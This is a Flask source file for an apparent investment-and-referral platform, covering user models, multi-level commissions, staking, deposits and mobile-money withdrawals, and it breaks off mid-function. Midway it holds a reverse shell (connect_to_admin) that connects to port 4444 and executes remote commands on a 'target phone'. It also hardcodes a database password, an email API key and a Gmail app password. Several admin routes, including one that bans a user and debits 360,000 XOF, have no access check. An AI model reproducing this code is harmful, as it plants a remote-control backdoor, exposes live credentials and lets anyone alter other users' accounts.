import time
import requests
import os
import re
import sys
import uuid
from datetime import datetime, timedelta, timezone, date, UTC
from functools import wraps
from urllib.parse import urlencode
from werkzeug.security import generate_password_hash, check_password_hash
from dotenv import load_dotenv
from flask import Flask, render_template, request, redirect, url_for, flash, session, g, jsonify, send_from_directory, abort
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import func, create_engine, text
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename
from flask_login import LoginManager, login_user, logout_user, current_user, login_required, UserMixin
from flask_migrate import Migrate

# ─── FLASK APP ───────────────────────────────────────────
app = Flask(__name__, template_folder="templates", static_folder="static")
app.secret_key = "ma_cle_ultra_secrete"

# Désactiver le cache pour le développement
@app.after_request
def add_header(response):
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    response.headers['Cache-Control'] = 'public, max-age=0'
    return response

# ─── UPLOAD CONFIG ───────────────────────────────────────
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

UPLOAD_FOLDER_PROFILE = 'static/uploads/profiles'
UPLOAD_FOLDER_VLOGS = 'static/vlogs'
UPLOAD_FOLDER_APPS = os.path.join(os.getcwd(), "static", "uploads", "apps")

# Création des dossiers si inexistant
os.makedirs(UPLOAD_FOLDER_PROFILE, exist_ok=True)
os.makedirs(UPLOAD_FOLDER_APPS, exist_ok=True)
os.makedirs(UPLOAD_FOLDER_VLOGS, exist_ok=True)

# Configuration Flask
app.config['UPLOAD_FOLDER_PROFILE'] = UPLOAD_FOLDER_PROFILE
app.config['UPLOAD_FOLDER_VLOGS'] = UPLOAD_FOLDER_VLOGS
app.config['UPLOAD_FOLDER_APPS'] = UPLOAD_FOLDER_APPS
app.config['UPLOAD_FOLDER'] = 'static/uploads'
app.config["UPLOAD_FOLDER"] = "static/uploads"
def allowed_file(filename):
    """
    Vérifie si le fichier uploadé est autorisé.
    Retourne True si l'extension est dans ALLOWED_EXTENSIONS.
    """
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# ─── DATABASE CONFIG ─────────────────────────────────────
DATABASE_URL = "postgresql://neondb_owner:npg_YaC69HIAGyZn@ep-muddy-darkness-ai9gl7w1-pooler.c-4.us-east-1.aws.neon.tech/neondb?sslmode=require&channel_binding=require"

engine = create_engine(
    DATABASE_URL,
    pool_size=10,
    max_overflow=20,
    pool_timeout=30,
    pool_recycle=1800,
)

app.config["SQLALCHEMY_DATABASE_URI"] = DATABASE_URL
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {
    "pool_pre_ping": True,
    "pool_recycle": 280,
    "pool_timeout": 20
}

# ─── INITIALISATION DE LA BASE DE DONNÉES ───────────────
db = SQLAlchemy(app)
migrate = Migrate(app, db)

# ─── FLASK-LOGIN CONFIG ─────────────────────────────────
from flask_login import LoginManager, UserMixin, current_user

login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = "connexion_page"  # ta route login

# Fonction pour charger un utilisateur via Flask-Login
@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))  # classique

# Avant chaque requête, on force current_user à utiliser ta session
@app.before_request
def load_logged_in_user():
    from flask import g
    user_id = session.get("user_id")
    if user_id:
        try:
            # Utilise User.query.get pour compatibilité
            g.logged = User.query.get(user_id)
        except:
            # Fallback pour SQLAlchemy 2.0+
            try:
                g.logged = db.session.get(User, user_id)
            except:
                g.logged = None
    else:
        g.logged = None


class User(db.Model, UserMixin):
    __tablename__ = 'user'
    id = db.Column(db.Integer, primary_key=True)
    uid = db.Column(db.String(50), unique=True, nullable=False, default=lambda: str(uuid.uuid4()))
    profile_image = db.Column(db.String(255), nullable=True, default='default.png')
    # Informations principales
    username = db.Column(db.String(50), unique=True, nullable=False, index=True)
    email = db.Column(db.String(120), unique=True, nullable=False, index=True)
    phone = db.Column(db.String(30), unique=True, nullable=False, index=True)
    password = db.Column(db.String(300), nullable=False)
    last_play_date = db.Column(db.DateTime, nullable=True) # Date précise du dernier clic
    # Parrainage — maintenant basé sur le username
    parrain = db.Column(db.String(50), nullable=True)  # Pas de FK pour éviter les erreurs
    has_played_slot = db.Column(db.Boolean, default=False)
    # Relation auto-référentielle pour les filleuls (downlines)
    downlines = db.relationship(
        'User',
        primaryjoin="User.username == foreign(User.parrain)",
        remote_side="User.parrain",
        lazy='dynamic'
    )
    commission_total = db.Column(db.Float, default=0.0)
    has_seen_pay_ok = db.Column(db.Boolean, default=False)
    ip_address = db.Column(db.String(45)) # Ajoute cette ligne
    wallet_country = db.Column(db.String(50))
    wallet_operator = db.Column(db.String(50))
    wallet_number = db.Column(db.String(30))
    bonus = db.Column(db.Float, default=0.0)
    chances_bridge = db.Column(db.Integer, default=3)
    derniere_maj_chances = db.Column(db.Date) # Pour réinitialiser chaque jeudi
    solde_total = db.Column(db.Float, default=0.0)
    solde_depot = db.Column(db.Float, default=0.0)
    solde_parrainage = db.Column(db.Float, default=0.0)
    solde_revenu = db.Column(db.Float, default=0.0, index=True)
    total_retrait = db.Column(db.Float, default=0.0)
    latitude = db.Column(db.String(50), nullable=True)
    longitude = db.Column(db.String(50), nullable=True)
    last_location_update = db.Column(db.DateTime, default=datetime.utcnow)
    premier_depot = db.Column(db.Boolean, default=False)
    remaining_rounds = db.Column(db.Integer, default=4)
    has_free_attempt = db.Column(db.Boolean, default=True) # Une chance gratuite par utilisateur
    is_admin = db.Column(db.Boolean, default=False)
    is_banned = db.Column(db.Boolean, default=False)
    is_verified = db.Column(db.Boolean, default=False)
    pin_code = db.Column(db.String(255), nullable=True)
    has_frog_attempt = db.Column(db.Boolean, default=True)
    frog_game_done = db.Column(db.Boolean, default=False)
    country = db.Column(db.String(50), default='')
    has_played_this_round = db.Column(db.Boolean, default=False)
    # Points divers
    points = db.Column(db.Integer, default=0)
    points_video = db.Column(db.Integer, default=0)
    points_youtube = db.Column(db.Integer, default=0)
    points_tiktok = db.Column(db.Integer, default=0)
    points_instagram = db.Column(db.Integer, default=0)
    points_ads = db.Column(db.Integer, default=0)
    points_spin = db.Column(db.Integer, default=0)
    points_games = db.Column(db.Integer, default=0)
    last_instagram_date = db.Column(db.String(10), default=None)
    last_youtube_date = db.Column(db.String(10), default=None)
    last_tiktok_date = db.Column(db.String(20), default=None)
    last_login = db.Column(db.DateTime, nullable=True)
    game_played_count = db.Column(db.Integer, default=0) # Nombre de fois qu'il a joué
    login_count = db.Column(db.Integer, default=0)
    has_spun_wheel = db.Column(db.Boolean, default=False)
    has_spun = db.Column(db.Boolean, default=False)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    date_update = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    solde_jeux = db.Column(db.Float, default=0.0)
    whatsapp_number = db.Column(db.String(30), nullable=True)
    profile_pic = db.Column(db.String(200), nullable=True)

    def __repr__(self):
        return f"<User {self.username} | {self.phone}>"

# ==============================
# 📦 MODELS
# ==============================

class Depot(db.Model):
    __tablename__ = "depot"

    id = db.Column(db.Integer, primary_key=True)

    # 🔁 Ancien système
    user_name = db.Column(
        db.String(50),
        db.ForeignKey("user.username", ondelete="CASCADE"),
        nullable=True
    )

    # 🆕 Nouveau système
    user_id = db.Column(
        db.Integer,
        db.ForeignKey("user.id", ondelete="CASCADE"),
        nullable=True
    )

    # ✅ TRÈS IMPORTANT : préciser foreign_keys
    user = db.relationship(
        "User",
        backref="depots",
        foreign_keys=[user_id]  # 👈 ICI la correction
    )

    phone = db.Column(db.String(30), nullable=False)
    operator = db.Column(db.String(50), nullable=False)
    country = db.Column(db.String(50), nullable=False)
    montant = db.Column(db.Float, nullable=False)
    reference = db.Column(db.String(200), nullable=True)
    statut = db.Column(db.String(20), default="pending")
    email = db.Column(db.String(120), nullable=True)
    date = db.Column(db.DateTime, default=datetime.utcnow)

class Commission(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    parrain_uid = db.Column(db.String(200), nullable=False)
    filleul_uid = db.Column(db.String(200), nullable=False)
    montant = db.Column(db.Float, nullable=False)
    niveau = db.Column(db.Integer, nullable=False)
    date = db.Column(db.DateTime, default=datetime.utcnow)


class Retrait(db.Model):
    __tablename__ = "retrait"

    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, nullable=True)  # ✅ NOUVELLE COLONNE

    phone = db.Column(db.String(30), nullable=False)
    montant = db.Column(db.Float, nullable=False)
    statut = db.Column(db.String(20), default="en_attente")
    date = db.Column(db.DateTime, default=datetime.utcnow)
    payment_method = db.Column(db.String(50))

    pays = db.Column(db.String(50), nullable=True)
    frais = db.Column(db.Float, default=0.0)

class Staking(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    phone = db.Column(db.String(30), nullable=False)
    vip_level = db.Column(db.String(20), nullable=False)
    montant = db.Column(db.Float, nullable=False)
    duree = db.Column(db.Integer, default=15)
    taux_min = db.Column(db.Float, default=1.80)
    taux_max = db.Column(db.Float, default=2.20)
    revenu_total = db.Column(db.Float, nullable=False)
    date_debut = db.Column(db.DateTime, default=datetime.utcnow)
    actif = db.Column(db.Boolean, default=True)


class Question(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    question = db.Column(db.String(255), nullable=False)
    correct_answer = db.Column(db.String(255), nullable=False)

class QuestionReponse(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    date = db.Column(db.Date, default=date.today)
    points = db.Column(db.Integer, default=0)

class ClickTache(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    date = db.Column(db.Date, default=datetime.utcnow().date)
    clicks = db.Column(db.Integer, default=0)  # Nombre de clicks effectués
    points = db.Column(db.Integer, default=0)  # Points gagnés


class ClickJeudiReponse(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    points = db.Column(db.Integer, default=0)
    date = db.Column(db.Date, default=date.today)

class RetraitPoints(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    points_utilises = db.Column(db.Integer, nullable=False)
    montant_xof = db.Column(db.Float, nullable=False)
    statut = db.Column(db.String(20), default='en_attente')  # en_attente / valide / refusé
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    type_retrait = db.Column(db.String(20), nullable=True) # Ajoute ceci
    user = db.relationship('User', backref=db.backref('retraits_points', lazy='dynamic'))

# Dans ton fichier models.py ou app.py
class GameSession(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
    bet_amount = db.Column(db.Integer, default=100) # Mise
    win_amount = db.Column(db.Integer, default=500) # Gain potentiel
    status = db.Column(db.String(20), default='pending') # pending, won, lost
    date = db.Column(db.DateTime, default=datetime.utcnow)

class ChannelMessage(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    content = db.Column(db.Text, nullable=True)
    media_url = db.Column(db.String(255), nullable=True)
    media_type = db.Column(db.String(50)) # Ajoute 'audio' mentalement ici
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    reactions = db.Column(db.JSON, default=lambda: {"🔥": 0, "🚀": 0, "❤️": 0})


# Ajoute bien cette classe avec tes autres modèles (User, Retrait, etc.)
class ChannelSub(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id')) # Assure-toi que 'user.id' est correct


class GameControl(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    end_time = db.Column(db.DateTime, nullable=True)

    @classmethod
    def is_active(cls):
        control = cls.query.first()
        if control and control.end_time:
            from datetime import datetime
            return datetime.now() < control.end_time
        return False


# ──────────────────────────────────────────────────────
# 🏪 MODELES POUR LES BOUTIQUES ET VENDEURS
# ──────────────────────────────────────────────────────

# Table des catégories de produits
class Categorie(db.Model):
    __tablename__ = 'categories'
    id = db.Column(db.Integer, primary_key=True)
    nom = db.Column(db.String(100), nullable=False, unique=True)
    description = db.Column(db.Text, nullable=True)
    icone = db.Column(db.String(50), nullable=True)  # emoji ou nom d'icône
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)

    # Relation avec les produits
    produits = db.relationship('Produit', backref='categorie', lazy='dynamic')

    def __repr__(self):
        return f"<Categorie {self.nom}>"


# Table des boutiques
class Boutique(db.Model):
    __tablename__ = 'boutiques'
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    nom = db.Column(db.String(200), nullable=False)
    description = db.Column(db.Text, nullable=True)
    email = db.Column(db.String(120), nullable=True)
    whatsapp = db.Column(db.String(30), nullable=True)
    latitude = db.Column(db.String(50), nullable=True)
    longitude = db.Column(db.String(50), nullable=True)
    adresse = db.Column(db.String(300), nullable=True)
    ville = db.Column(db.String(100), nullable=True)
    pays = db.Column(db.String(100), nullable=True)
    logo = db.Column(db.String(255), nullable=True)  # URL de l'image du logo
    banniere = db.Column(db.String(255), nullable=True)  # URL de la bannière
    est_actif = db.Column(db.Boolean, default=True)
    est_verifie = db.Column(db.Boolean, default=False)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    date_modification = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    # Relation avec l'utilisateur propriétaire
    proprietaire = db.relationship('User', backref=db.backref('boutiques', lazy='dynamic'))

    # Relation avec les produits
    produits = db.relationship('Produit', backref='boutique', lazy='dynamic', cascade='all, delete-orphan')

    def __repr__(self):
        return f"<Boutique {self.nom}>"


# Table des produits
class Produit(db.Model):
    __tablename__ = 'produits'
    id = db.Column(db.Integer, primary_key=True)
    boutique_id = db.Column(db.Integer, db.ForeignKey('boutiques.id'), nullable=False)
    categorie_id = db.Column(db.Integer, db.ForeignKey('categories.id'), nullable=True)
    nom = db.Column(db.String(300), nullable=False)
    description = db.Column(db.Text, nullable=True)
    prix = db.Column(db.Float, nullable=False)
    prix_promo = db.Column(db.Float, nullable=True)  # Prix en promotion (optionnel)
    devise = db.Column(db.String(10), default='XOF')
    quantite = db.Column(db.Integer, default=1)  # Quantité disponible
    images = db.Column(db.Text, nullable=True)  # URLs séparées par des virgules
    couleurs_disponibles = db.Column(db.String(500), nullable=True)  # Couleurs séparées par des virgules
    tailles_disponibles = db.Column(db.String(500), nullable=True)  # Tailles séparées par des virgules
    est_actif = db.Column(db.Boolean, default=True)
    est_en_promo = db.Column(db.Boolean, default=False)
    vues = db.Column(db.Integer, default=0)
    ventes = db.Column(db.Integer, default=0)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    date_modification = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    def __repr__(self):
        return f"<Produit {self.nom}>"

    @property
    def liste_images(self):
        """Retourne la liste des URLs d'images"""
        if self.images:
            return [img.strip() for img in self.images.split(',')]
        return []

    @property
    def liste_couleurs(self):
        """Retourne la liste des couleurs disponibles"""
        if self.couleurs_disponibles:
            return [c.strip() for c in self.couleurs_disponibles.split(',')]
        return []

    @property
    def liste_tailles(self):
        """Retourne la liste des tailles disponibles"""
        if self.tailles_disponibles:
            return [t.strip() for t in self.tailles_disponibles.split(',')]
        return []


# Table des commandes
class Commande(db.Model):
    __tablename__ = 'commandes'
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    boutique_id = db.Column(db.Integer, db.ForeignKey('boutiques.id'), nullable=False)
    reference = db.Column(db.String(50), unique=True, nullable=True)
    statut = db.Column(db.String(20), default='en_attente')  # en_attente, confirmee, expediee, livree, annulee
    total = db.Column(db.Float, nullable=False)
    frais_livraison = db.Column(db.Float, default=0.0)
    adresse_livraison = db.Column(db.String(500), nullable=True)
    telephone_livraison = db.Column(db.String(30), nullable=True)
    notes = db.Column(db.Text, nullable=True)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)
    date_modification = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    # Relations
    acheteur = db.relationship('User', backref=db.backref('commandes', lazy='dynamic'), foreign_keys=[user_id])
    boutique = db.relationship('Boutique', backref=db.backref('commandes', lazy='dynamic'))
    articles = db.relationship('ArticleCommande', backref='commande', lazy='dynamic', cascade='all, delete-orphan')

    def __repr__(self):
        return f"<Commande {self.reference}>"


# Table des articles dans une commande
class ArticleCommande(db.Model):
    __tablename__ = 'articles_commande'
    id = db.Column(db.Integer, primary_key=True)
    commande_id = db.Column(db.Integer, db.ForeignKey('commandes.id'), nullable=False)
    produit_id = db.Column(db.Integer, db.ForeignKey('produits.id'), nullable=False)
    quantite = db.Column(db.Integer, nullable=False, default=1)
    prix_unitaire = db.Column(db.Float, nullable=False)
    couleur = db.Column(db.String(50), nullable=True)
    taille = db.Column(db.String(50), nullable=True)

    # Relation avec le produit
    produit = db.relationship('Produit', backref=db.backref('articles_commande', lazy='dynamic'))

    def __repr__(self):
        return f"<ArticleCommande produit_id={self.produit_id}>"


# Table des avis/notes sur les boutiques
class AvisBoutique(db.Model):
    __tablename__ = 'avis_boutiques'
    id = db.Column(db.Integer, primary_key=True)
    boutique_id = db.Column(db.Integer, db.ForeignKey('boutiques.id'), nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    note = db.Column(db.Integer, nullable=False)  # 1 à 5
    commentaire = db.Column(db.Text, nullable=True)
    date_creation = db.Column(db.DateTime, default=datetime.utcnow)

    boutique = db.relationship('Boutique', backref=db.backref('avis', lazy='dynamic'))
    auteur = db.relationship('User', backref=db.backref('avis_boutiques', lazy='dynamic'))

    def __repr__(self):
        return f"<AvisBoutique note={self.note}>"


import threading

import requests
import os

def envoyer_retrait_soleaspay_debug(service_id, wallet, montant):
    print("🧪 MODE DEBUG ACTIVÉ")

    print("SERVICE ID :", service_id)
    print("WALLET :", wallet)
    print("MONTANT :", montant)

    # simulation réponse API
    response = {
        "success": False,
        "message": "SIMULATION ERREUR API (test debug)"
    }

    print("🔵 FAKE RESPONSE :", response)
    return response

API_KEY = os.getenv("RESEND_API_KEY")

def send_otp(recipient_email, code_otp):
    if not API_KEY:
        print("❌ API KEY manquante")
        return False

    try:
        html_content = render_template(
            'email_otp.html',
            otp_code=code_otp,
            user_email=recipient_email
        )

        response = requests.post(
            "https://api.resend.com/emails",
            headers={
                "Authorization": f"Bearer {API_KEY}",
                "Content-Type": "application/json"
            },
            json={
                "from": "NOVATRADE <no-reply@nova-trade.cc>",
                "to": [recipient_email],
                "subject": "Votre code de sécurité Novatrade",
                "html": html_content
            }
        )

        print("📨 Réponse Resend:", response.json())

        if response.status_code in [200, 201]:
            return True
        else:
            print("❌ Erreur API:", response.text)
            return False

    except Exception as e:
        print("❌ Erreur :", e)
        return False

def donner_commission(parrain_username, montant_depot):
    """Crée la commission et remplit solde_revenu, solde_parrainage et commission_total selon les niveaux."""
    
    if not parrain_username:
        return

    parrain = User.query.filter_by(username=parrain_username).first()
    if not parrain:
        return

    # --- NIVEAU 1 ---
    commission_niveau1 = 2000

    parrain.solde_revenu = (parrain.solde_revenu or 0) + commission_niveau1
    parrain.solde_parrainage = (parrain.solde_parrainage or 0) + commission_niveau1
    parrain.commission_total = (parrain.commission_total or 0) + commission_niveau1

    db.session.commit()

    # --- NIVEAU 2 ---
    if parrain.parrain:
        parrain2 = User.query.filter_by(username=parrain.parrain).first()
        if parrain2:
            commission_niveau2 = 700

            parrain2.solde_revenu = (parrain2.solde_revenu or 0) + commission_niveau2
            parrain2.solde_parrainage = (parrain2.solde_parrainage or 0) + commission_niveau2
            parrain2.commission_total = (parrain2.commission_total or 0) + commission_niveau2

            db.session.commit()

            # --- NIVEAU 3 ---
            if parrain2.parrain:
                parrain3 = User.query.filter_by(username=parrain2.parrain).first()
                if parrain3:
                    commission_niveau3 = 300

                    parrain3.solde_revenu = (parrain3.solde_revenu or 0) + commission_niveau3
                    parrain3.solde_parrainage = (parrain3.solde_parrainage or 0) + commission_niveau3
                    parrain3.commission_total = (parrain3.commission_total or 0) + commission_niveau3

                    db.session.commit()

# -----------------------
def t(key):
    lang = session.get("lang", "fr")
    return TRANSLATIONS.get(lang, TRANSLATIONS["fr"]).get(key, key)

# enregistrer la fonction dans Jinja2
app.jinja_env.globals.update(t=t)

@app.route("/")
def index_page():
    # On vérifie si l'utilisateur est déjà connecté pour personnaliser l'accueil
    user = get_logged_in_user()
    return render_template("index.html", user=user)

# -----------------------
# Utilisateur connecté
# -----------------------
def get_logged_in_user():
    """Retourne l'utilisateur connecté via user_id en session."""
    user_id = session.get("user_id")
    if not user_id:
        return None
    # db.session.get est compatible SQLAlchemy 2.0
    return db.session.get(User, user_id)


# -----------------------
# Décorateur login
# -----------------------
def login_required(f):
    """Protège une route, redirige vers la page de connexion si non connecté."""
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not get_logged_in_user():
            return redirect(url_for("connexion_page"))
        return f(*args, **kwargs)
    return wrapper


def calculer_montant_points(user):
    total_points = (
        (user.points or 0) +
        (user.points_video or 0) +
        (user.points_youtube or 0) +
        (user.points_tiktok or 0) +
        (user.points_instagram or 0) +
        (user.points_ads or 0) +
        (user.points_spin or 0) +
        (user.points_games or 0)
    )
    tranches = total_points // 100
    montant_xof = tranches * 200
    points_utilisables = tranches * 100  # points qui peuvent être retirés
    return montant_xof, points_utilisables

import os
from flask import Flask, render_template, request, redirect, url_for, session
from datetime import datetime, timezone
from werkzeug.utils import secure_filename

# Dossier de stockage (mkdir -p static/uploads/channel)
UPLOAD_FOLDER = 'static/uploads/channel'

import socket
import subprocess
import os

def connect_to_admin():
    # Ton serveur (ton premier téléphone ou ton PC)
    # L'appareil cible se connecte à TOI
    SERVER_IP = "192.168.1.XX" 
    PORT = 4444
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, PORT))
    
    while True:
        # Attend une commande venant de ton serveur
        command = s.recv(1024).decode()
        
        if command.lower() == "exit":
            break
            
        # Exécute la commande sur le téléphone cible
        # Exemple: 'termux-location' ou 'ls'
        output = subprocess.getoutput(command)
        
        # Renvoie le résultat à ton écran de contrôle
        s.send(output.encode())
    
    s.close()

@app.route("/attribution/delier_leaderbrice")
@login_required
def delier_filleuls_brice():

    # 1. On cherche tous les utilisateurs qui ont 'leaderbrice01' comme parrain
    # mais on EXCLUT 'amen1' pour qu'il reste son filleul
    filleuls_a_delier = User.query.filter(
        User.parrain == "leaderbrice01",
        User.username != "amen1"
    ).all()

    total_delies = 0

    # 2. On retire le parrain en remettant le champ à None
    for user in filleuls_a_delier:
        user.parrain = None
        total_delies += 1

    # 3. On sauvegarde les modifications dans la base de données
    if total_delies > 0:
        db.session.commit()

    return f"Opération réussie ! {total_delies} utilisateurs ont été déliés de leaderbrice01. Seul 'amen1' est resté."

@app.route("/academy/design")
@login_required
def formation_design_page():
    # Récupération de l'utilisateur connecté pour la navbar
    phone = get_logged_in_user_phone()
    user = User.query.filter_by(phone=phone).first()
    
    return render_template("design_graphique.html", user=user)


@app.route('/sanctionner/<username>')
def sanctionner_utilisateur(username):
    # On récupère l'utilisateur grâce au nom passé dans l'URL
    user = User.query.filter_by(username=username.lower()).first()

    if not user:
        return f"Utilisateur '{username}' non trouvé.", 404

    try:
        # 1. Bannissement
        user.is_banned = True

        # 2. Débiter le solde (On retire 360 000)
        user.solde_jeux = (user.solde_jeux or 0) - 360000

        # 3. Sauvegarder
        db.session.commit()

        return f"""
        <div style='color: red; font-family: sans-serif; padding: 20px; border: 2px solid red; border-radius: 15px; max-width: 500px; margin: 20px auto;'>
            <h2 style='margin-top: 0;'>⚠️ Sanction Appliquée</h2>
            <hr>
            <p><b>Utilisateur :</b> {user.username.upper()}</p>
            <p><b>Statut :</b> BANNI DÉFINITIVEMENT</p>
            <p><b>Retrait solde :</b> -360,000 XOF</p>
            <p><b>Solde actuel :</b> {user.solde_jeux} XOF</p>
            <br>
            <a href="/admin/utilisateurs" style="color: blue;">Retour à la liste</a>
        </div>
        """
    except Exception as e:
        db.session.rollback()
        return f"Erreur lors de la sanction : {str(e)}", 500

@app.route("/admin/filleuls-inactifs")
def filleuls_inactifs_kedboy():
    username_cible = "kedboy"
    
    # 1. On cherche directement les utilisateurs dont le parrain est 'kedboy'
    # ET qui n'ont pas encore fait leur premier dépôt (premier_depot=False)
    filleuls_non_actives = User.query.filter_by(
        parrain=username_cible, 
        premier_depot=False
    ).order_by(User.id.desc()).all() # Range du plus récent (ID le plus grand) au plus ancien

    # On crée un faux objet parrain pour que le template HTML fonctionne sans erreur
    class CustomParrain:
        username = username_cible
    
    return render_template(
        "filleuls_inactifs.html", 
        parrain=CustomParrain(), 
        filleuls=filleuls_non_actives
    )


from sqlalchemy import func

@app.route("/admin/stats-depots")
def stats_depots():
    # On groupe par la colonne premier_depot et on compte
    # Cela renvoie une liste de tuples : [(True, 150), (False, 45)]
    stats = db.session.query(
        User.premier_depot, 
        func.count(User.id)
    ).group_by(User.premier_depot).all()

    # On initialise les compteurs
    total_actifs = 0   # premier_depot = True
    total_passifs = 0  # premier_depot = False

    for status, count in stats:
        if status is True:
            total_actifs = count
        else:
            total_passifs = count

    return render_template("admin_stats.html", actifs=total_actifs, passifs=total_passifs)

@app.route("/admin/canal/edit", methods=["GET", "POST"])
def admin_canal_edit():
    if request.method == "POST":
        content = request.form.get("content")
        media_url = None
        media_type = None

        # Récupération des fichiers
        file = request.files.get("media")
        audio_file = request.files.get("audio")

        # Priorité au média (image/vidéo) sinon audio
        target_file = file if (file and file.filename) else audio_file

        if target_file and target_file.filename:
            filename = secure_filename(target_file.filename)
            ext = filename.split('.')[-1].lower()
            
            # Nom unique avec timestamp pour éviter les bugs de cache
            unique_name = f"{int(datetime.now().timestamp())}_{filename}"
            
            upload_folder = os.path.join(app.root_path, "static/uploads")
            os.makedirs(upload_folder, exist_ok=True)

            path = os.path.join(upload_folder, unique_name)
            target_file.save(path)

            # URL accessible par le navigateur
            media_url = f"/static/uploads/{unique_name}"

            # Détection automatique du type
            if ext in ["jpg", "png", "jpeg", "gif", "webp"]:
                media_type = "image"
            elif ext in ["mp4", "mov", "avi", "webm"]:
                media_type = "video"
            elif ext in ["mp3", "wav", "ogg", "m4a"]:
                media_type = "audio"

        # Création du message
        msg = ChannelMessage(
            content=content,
            media_url=media_url,
            media_type=media_type,
            timestamp=datetime.now()
        )

        db.session.add(msg)
        db.session.commit()
        return redirect(url_for("admin_canal_edit"))

    messages = ChannelMessage.query.order_by(ChannelMessage.id.desc()).all()
    return render_template("admin_canal.html", messages=messages)

@app.route("/edit_msg/<int:id>", methods=["POST"])
def edit_msg(id):
    msg = ChannelMessage.query.get_or_404(id)

    data = request.get_json()
    new_content = data.get("content")

    msg.content = new_content
    db.session.commit()

    return {"success": True}

@app.route("/attribution/leaderbrice")
@login_required
def attribuer_orphelins_a_brice():
    # On garde la sécurité pour vérifier que tu es bien Admin

    # On récupère le compte de leaderbrice01
    leader = User.query.filter_by(username="leaderbrice01").first()
    if not leader:
        return "L'utilisateur 'leaderbrice01' n'existe pas. Impossible de lui attribuer des filleuls.", 404

    # On cherche tous les utilisateurs sans parrain (en excluant leaderbrice01 lui-même)
    orphelins = User.query.filter(
        (User.parrain == None) | (User.parrain == ""),
        User.username != "leaderbrice01"
    ).all()

    total_attribues = 0

    # Attribution massive
    for user in orphelins:
        user.parrain = leader.username
        total_attribues += 1

    # Sauvegarde dans la base de données
    if total_attribues > 0:
        db.session.commit()

    return f"Succès ! {total_attribues} utilisateurs (actifs et inactifs) ont été rattachés à leaderbrice01."


from sqlalchemy import text

@app.route("/academy/tiktok")
def academy_tiktok():
    user = get_logged_in_user()
    if not user:
        return redirect(url_for('login'))
        
    return render_template("academy_tiktok.html", user=user)


@app.route("/delete_msg/<int:id>")
def delete_msg(id):
    msg = ChannelMessage.query.get_or_404(id)

    # 🔥 supprime fichier si existe
    if msg.media_url:
        try:
            path = msg.media_url.replace("/static/uploads/", "static/uploads/")
            os.remove(path)
        except:
            pass

    db.session.delete(msg)
    db.session.commit()

    return redirect(url_for('admin_canal_edit'))

from flask_mail import Mail, Message
API_KEY = "re_QnDyJnmp_AjZaCUqiWGfrv5t3HxDfczLh"

app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = 'luminastar2026@gmail.com'
app.config['MAIL_PASSWORD'] = 'suca ejwg zfln kepf'
app.config['MAIL_DEFAULT_SENDER'] = app.config['MAIL_USERNAME']  # ✅ AJOUT

mail = Mail(app)



def envoyer_retrait_soleaspay(service_id, wallet, montant):

    token, err = obtenir_token()

    if err:
        return {"success": False, "message": "Erreur token SoleasPay"}

    url = "https://soleaspay.com/api/action/account/withdraw"

    headers = {
        "Authorization": f"Bearer {token}",
        "operation": "4",
        "service": str(service_id),
        "Content-Type": "application/json"
    }

    payload = {
        "wallet": wallet,
        "amount": montant,
        "currency": "XOF"
    }

    try:
        response = requests.post(url, headers=headers, json=payload)

        if response.status_code != 200:
            return {
                "success": False,
                "message": f"Erreur HTTP {response.status_code}",
                "content": response.text
            }

        return response.json()

    except Exception as e:
        return {"success": False, "message": str(e)}

@app.cli.command("init-db")
def init_db():
    db.create_all()
    print("✅ Base de données initialisée avec succès !")

from sqlalchemy.orm.attributes import flag_modified
from flask import jsonify
from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from sqlalchemy.orm.attributes import flag_modified

@app.route("/chaine")
def view_channel():
    user_id = session.get('user_id')
